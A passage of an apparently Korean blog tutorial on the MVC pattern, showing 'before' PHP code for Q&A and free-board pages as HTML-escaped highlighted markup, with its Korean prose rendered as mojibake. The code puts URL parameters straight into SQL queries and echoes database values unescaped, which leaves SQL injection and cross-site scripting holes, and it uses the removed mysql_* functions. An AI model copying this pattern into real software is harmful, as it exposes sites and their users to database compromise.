&lt;p&gt;ì¦‰ 10ê°œì˜ ê²Œì‹œíŒì´ ì¶”ê°€ëœë‹¤ë©´ (30ê°œì˜ php íŒŒì¼ì´ ìƒì„±ë˜ë©°, N*3ì´ ëœë‹¤.)&lt;/p&gt;

&lt;h2 id=&quot;mvc-pattern---ì ìš©-ì „-ì½”ë“œí¸&quot;&gt;[MVC Pattern - ì ìš© ì „ (ì½”ë“œí¸)]&lt;/h2&gt;

&lt;hr /&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;./head.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;

&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_SESSION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'id'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;script&amp;gt;alert('Only logged-in Users can.');&amp;lt;/script&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;script&amp;gt;history.back();&amp;lt;/script&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'no'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;

	&lt;span class=&quot;nv&quot;&gt;$no&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'no'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;./conn.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;UPDATE QnA_board SET hit = hit + 1 WHERE BINARY no = &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$no&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;nb&quot;&gt;mysql_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

	&lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;SELECT * FROM QnA_board WHERE BINARY no = &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$no&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mysql_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;die&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mysql_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
	&lt;span class=&quot;nv&quot;&gt;$row&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mysql_fetch_assoc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	
	&lt;span class=&quot;nv&quot;&gt;$nickname&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$row&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'nickname'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
	&lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;SELECT id, about, photo FROM User WHERE BINARY nickname = '&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$nickname&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;'&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mysql_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;die&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mysql_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
	&lt;span class=&quot;nv&quot;&gt;$user_row&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mysql_fetch_assoc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

	&lt;span class=&quot;nb&quot;&gt;mysql_close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;

 ..... ìƒëµ

&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;content&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;container-fluid&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;row&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
			&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;col-md-12&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
				&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;card&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
					&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;header&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
						&lt;span class=&quot;nt&quot;&gt;&amp;lt;h4&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;title&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Q&lt;span class=&quot;ni&quot;&gt;&amp;amp;amp;&lt;/span&gt;A Board&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h4&amp;gt;&lt;/span&gt;
						&lt;span class=&quot;nt&quot;&gt;&amp;lt;p&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;category&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;1:1, Only logged in users.&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
					&lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
					&lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;content table-responsive table-full-width&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
						&lt;span class=&quot;nt&quot;&gt;&amp;lt;table&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;table table-striped&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
							&lt;span class=&quot;nt&quot;&gt;&amp;lt;thead&amp;gt;&lt;/span&gt;
								&lt;span class=&quot;nt&quot;&gt;&amp;lt;tr&amp;gt;&lt;/span&gt;
									&lt;span class=&quot;nt&quot;&gt;&amp;lt;th&amp;gt;&lt;/span&gt;Number&lt;span class=&quot;nt&quot;&gt;&amp;lt;/th&amp;gt;&lt;/span&gt;
									&lt;span class=&quot;nt&quot;&gt;&amp;lt;th&amp;gt;&lt;/span&gt;Title&lt;span class=&quot;nt&quot;&gt;&amp;lt;/th&amp;gt;&lt;/span&gt;
									&lt;span class=&quot;nt&quot;&gt;&amp;lt;th&amp;gt;&lt;/span&gt;Writer&lt;span class=&quot;nt&quot;&gt;&amp;lt;/th&amp;gt;&lt;/span&gt;
									&lt;span class=&quot;nt&quot;&gt;&amp;lt;th&amp;gt;&lt;/span&gt;Date&lt;span class=&quot;nt&quot;&gt;&amp;lt;/th&amp;gt;&lt;/span&gt;
									&lt;span class=&quot;nt&quot;&gt;&amp;lt;th&amp;gt;&lt;/span&gt;views&lt;span class=&quot;nt&quot;&gt;&amp;lt;/th&amp;gt;&lt;/span&gt;
								&lt;span class=&quot;nt&quot;&gt;&amp;lt;/tr&amp;gt;&lt;/span&gt;
							&lt;span class=&quot;nt&quot;&gt;&amp;lt;/thead&amp;gt;&lt;/span&gt;
							&lt;span class=&quot;nt&quot;&gt;&amp;lt;tbody&amp;gt;&lt;/span&gt;

..... ìƒëµ

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;[QnA ê²Œì‹œíŒ]&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;./head.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;

&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'no'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;

    &lt;span class=&quot;nv&quot;&gt;$no&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'no'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;./conn.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;UPDATE free_board SET hit = hit + 1 WHERE BINARY no = &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$no&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;mysql_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;die&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mysql_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;

    &lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;SELECT * FROM free_board WHERE BINARY no = &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$no&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mysql_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;die&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mysql_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$row&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mysql_fetch_assoc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;nv&quot;&gt;$nickname&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$row&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'nickname'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;SELECT id, about, photo FROM User WHERE BINARY nickname = '&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$nickname&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;'&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mysql_query&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;die&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mysql_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;
    &lt;span class=&quot;nv&quot;&gt;$user_row&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;mysql_fetch_assoc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;mysql_close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;.....&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ìƒëµ&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;div&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;content&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;div&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;container-fluid&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;div&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;row&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
                &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;div&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;col-lg-4 col-md-5&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
                    &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;div&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;card card-user&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
                        &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;div&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;image&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
                            &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;img&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;assets/img/background.jpg&quot;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;alt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;...&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&amp;gt;&lt;/span&gt;
                        &lt;span class=&quot;o&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;div&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
                        &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;div&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;content&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
                            &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;div&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;author&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
                                &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;img&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;avatar border-white&quot;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;assets/img/no-profile-male-img.gif&quot;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;alt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;...&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&amp;gt;&lt;/span&gt;
                                &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;h4&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;title&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;lt;?&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$row&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'nickname'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;br/&amp;gt;&lt;/span&gt;
                                    &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;#&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
                                        &lt;span class=&quot;nt&quot;&gt;&amp;lt;small&amp;gt;&lt;/span&gt;@&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$row&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'ip'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/small&amp;gt;&lt;/span&gt;
                                    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
                                &lt;span class=&quot;nt&quot;&gt;&amp;lt;/h4&amp;gt;&lt;/span&gt;
                            &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
                            &lt;span class=&quot;nt&quot;&gt;&amp;lt;p&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;description text-center&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
                                Free_Board
                            &lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
                        &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;

                    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
                &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
                &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;col-lg-8 col-md-7&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
                    &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;card&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
